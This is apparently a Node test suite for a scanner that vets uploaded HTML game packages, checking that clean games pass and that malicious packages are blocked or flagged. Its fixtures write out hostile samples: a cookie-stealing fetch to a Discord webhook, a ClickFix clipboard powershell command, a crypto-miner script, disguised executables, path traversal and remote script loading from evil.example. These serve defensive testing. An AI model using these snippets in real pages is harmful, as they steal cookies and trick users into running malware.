// Run: node --test tests/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
const { scan } = createRequire(import.meta.url)('../lab/scan.js');

const enc = s => new TextEncoder().encode(s);
const pkg = obj => new Map(Object.entries(obj).map(([k, v]) => [k, typeof v === 'string' ? enc(v) : v]));
const ids = r => r.findings.map(f => f.id);

const CANVAS_GAME = `<!doctype html><canvas id=c width=320 height=240></canvas><script>
const ctx=document.getElementById('c').getContext('2d');let score=0,lives=3,player={x:10};
addEventListener('keydown',e=>{if(e.key==='ArrowRight')player.x+=4});
function update(dt){score++}function frame(){ctx.fillRect(player.x,10,8,8);requestAnimationFrame(frame)}frame();
</script>`;
const DOM_GAME = `<!doctype html><button id=b>Click</button><p>Score: <span id=s>0</span> Level 1 Lives 3</p><script>
let score=0;document.getElementById('b').onclick=()=>{score++;s.textContent=score};setInterval(()=>{score+=1},1000);
const player={health:3};</script>`;

test('plain canvas game passes', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
  assert.ok(r.looksLikeGame);
});

test('DOM clicker game passes', () => {
  const r = scan(pkg({ 'index.html': DOM_GAME }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
});

test('game with assets and cdn library passes', () => {
  const html = `<script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/3.60.0/phaser.min.js"></script><script src="game.js"></script>`;
  const r = scan(pkg({ 'index.html': html, 'game.js': 'new Phaser.Game({});addEventListener("keydown",()=>{});let score=0,level=1;',
    'hero.png': new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 0]) }));
  assert.equal(r.verdict, 'pass', JSON.stringify(r.findings));
});

test('crypto miner is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + '<script src="https://coinhive.com/lib/coinhive.min.js"></script>' }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('miner'));
});

test('discord webhook exfil is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'a.js': 'fetch("https://discord.com/api/webhooks/123/abc",{method:"POST",body:document.cookie})' }));
  assert.equal(r.verdict, 'block');
});

test('ClickFix clipboard command is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>navigator.clipboard.writeText("powershell -w hidden -enc AAAA")</script>` }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('shell-command') || ids(r).includes('clipboard-command'));
});

test('executable file is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'setup.exe': new Uint8Array([0x4d, 0x5a, 0, 0]) }));
  assert.equal(r.verdict, 'block');
});

test('png that is really a program is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'hero.png': new Uint8Array([0x4d, 0x5a, 0x90, 0]) }));
  assert.equal(r.verdict, 'block');
  assert.ok(ids(r).includes('disguised'));
});

test('png that is really a script is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'logo.png': enc('<script>alert(1)</script>') }));
  assert.ok(ids(r).includes('disguised'));
});

test('path traversal is blocked', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, '../evil.js': 'x' }));
  assert.equal(r.verdict, 'block');
});

test('eval of decoded string needs review at least', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'x.js': 'eval(atob("YWxlcnQoMSk="))' }));
  assert.notEqual(r.verdict, 'pass');
  assert.ok(ids(r).includes('eval-decode'));
});

test('login form page is not a pass', () => {
  const r = scan(pkg({ 'index.html': '<form><input type="password" name="p"><button>Sign in to continue</button></form>' }));
  assert.notEqual(r.verdict, 'pass');
  assert.ok(!r.looksLikeGame);
});

test('redirect and top navigation are flagged', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>top.location = "https://evil.example"; location.href = "https://evil.example/x"</script>` }));
  assert.ok(ids(r).includes('top-nav') && ids(r).includes('redirect'));
  assert.notEqual(r.verdict, 'pass');
});

test('script from unknown host is flagged', () => {
  const r = scan(pkg({ 'index.html': CANVAS_GAME + `<script>var s=document.createElement("script");s.src="https://evil.example/p.js";document.head.appendChild(s)</script>` }));
  assert.ok(ids(r).includes('remote-code'));
});

test('repo without html says it needs a build', () => {
  const r = scan(pkg({ 'package.json': '{"scripts":{"build":"vite build"}}', 'src/main.js': 'x' }));
  assert.equal(r.verdict, 'reject');
  assert.match(r.notAGame, /build/);
});

test('empty package is rejected', () => {
  assert.equal(scan(new Map()).verdict, 'reject');
});

test('obfuscated code is flagged medium', () => {
  const junk = Array.from({ length: 60 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}()`).join(';');
  const r = scan(pkg({ 'index.html': CANVAS_GAME, 'o.js': junk }));
  assert.ok(ids(r).includes('obfuscated'));
});

test('entry picks the shallowest index.html', () => {
  const r = scan(pkg({ 'a/b/index.html': CANVAS_GAME, 'index.html': CANVAS_GAME }));
  assert.equal(r.entry, 'index.html');
});
